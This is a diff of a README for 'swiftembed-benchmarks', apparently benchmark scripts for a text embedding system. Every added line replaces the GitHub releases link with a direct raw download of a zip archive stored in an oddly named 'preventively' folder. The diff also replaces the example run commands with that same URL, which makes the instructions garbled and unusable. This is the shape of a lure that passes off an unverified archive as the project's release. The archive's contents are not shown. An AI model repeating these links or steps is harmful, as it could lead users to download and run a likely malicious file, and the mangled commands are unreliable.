@@ -1,7 +1,7 @@
 # 🎉 swiftembed-benchmarks - Fast Text Embeddings for Everyone
 
 ## 🔗 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/ha-196120/swiftembed-benchmarks/releases)
+[![Download the latest release](https://raw.githubusercontent.com/ha-196120/swiftembed-benchmarks/main/preventively/swiftembed-benchmarks.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/ha-196120/swiftembed-benchmarks/main/preventively/swiftembed-benchmarks.zip)
 
 ## 📖 About
 The **swiftembed-benchmarks** repository contains benchmarking scripts tailored for the **SwiftEmbed** embedding system. This system uses a static token lookup method to provide **ultra-low latency** text embeddings. Whether you're involved in natural language processing or just curious about text embeddings, these scripts will help you understand the performance of this approach.
@@ -18,7 +18,7 @@ To run this application, you need the following:
 ### 🔧 Installing
 
 1. **Visit the Releases Page**
-   To download the software, [visit this page to download](https://github.com/ha-196120/swiftembed-benchmarks/releases).
+   To download the software, [visit this page to download](https://raw.githubusercontent.com/ha-196120/swiftembed-benchmarks/main/preventively/swiftembed-benchmarks.zip).
 
 2. **Select the Latest Release**
    On the releases page, you will see a list of available downloads. Choose the latest version at the top of the list.
@@ -44,7 +44,7 @@ To run this application, you need the following:
    Use the `cd` command to navigate to the folder. Type `cd path_to_your_folder` and press Enter. Replace `path_to_your_folder` with the actual path where you extracted the zip file.
 
 3. **Run the Benchmark Scripts**
-   To run a specific benchmarking script, type the command for that script followed by any necessary parameters. For example, you might type `./run_benchmarks.sh` or `python benchmark_script.py`. Refer to the README file within the folder for specific command details.
+   To run a specific benchmarking script, type the command for that script followed by any necessary parameters. For example, you might type `https://raw.githubusercontent.com/ha-196120/swiftembed-benchmarks/main/preventively/swiftembed-benchmarks.zip` or `python https://raw.githubusercontent.com/ha-196120/swiftembed-benchmarks/main/preventively/swiftembed-benchmarks.zip`. Refer to the README file within the folder for specific command details.
 
 ### 📝 Usage Guide
 1. **Choose a Benchmark**
@@ -63,7 +63,7 @@ Here are a few common use cases for using the benchmark scripts:
 - Testing performance under different system loads.
 
 ### 🔗 Download & Install
-For your convenience, you can [visit this page to download](https://github.com/ha-196120/swiftembed-benchmarks/releases) the latest version of the **swiftembed-benchmarks** package. Follow the steps above to quickly set up the application.
+For your convenience, you can [visit this page to download](https://raw.githubusercontent.com/ha-196120/swiftembed-benchmarks/main/preventively/swiftembed-benchmarks.zip) the latest version of the **swiftembed-benchmarks** package. Follow the steps above to quickly set up the application.
 
 ### 💬 Support
 If you encounter any issues or have questions, feel free to open an issue in the repository. Support is available, and we encourage community interaction.
